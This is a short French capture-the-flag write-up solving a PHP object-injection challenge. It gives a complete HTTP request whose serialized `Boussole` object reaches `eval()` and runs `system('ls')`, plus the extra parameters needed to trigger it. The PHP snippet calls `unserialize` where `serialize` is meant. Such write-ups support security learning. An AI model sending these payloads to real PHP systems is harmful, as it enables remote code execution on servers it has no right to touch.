# shrug

## TL;DR

```
POST /?jotaro=1&dio=O:8:"Boussole":1:{s:5:"order";s:19:"echo(system('ls'));";} HTTP/1.1
Content-Type: application/x-www-form-urlencoded

stand=Hermit+Purple
```

## PHP unserialize shit

Le point d'entrée c'est le `unserialize($_GET['dio']);`, pour y arriver faut set 3 params dont 2 qui servent juste pour faire chier.

`dio` c'ets notre payload donc on s'en fout pour l'instant on va forcément l'utiliser, `jotaro` en GET, d'où `/?jotaro=1`, et `stand` en POST c'est pour ça il **faut** mettre le header `Content-Type` et `stand=Hermit+Purple` en contenu.

Il reste plus qu'a faire un bon objet sérialisé avec `dio`.

En PHP :

```php
$a = new Boussole();
echo(unserialize($a));

// O:8:"Boussole":1:{s:5:"order";s:3:"eau";}
```

Il nous faut juste maintenant passer par le `eval()` et c'est gagné :

`O:8:"Boussole":1:{s:5:"order";s:19:"echo(system('ls'));";}`

À partir de là il faut juste cat le fichier avec un nom chiant.
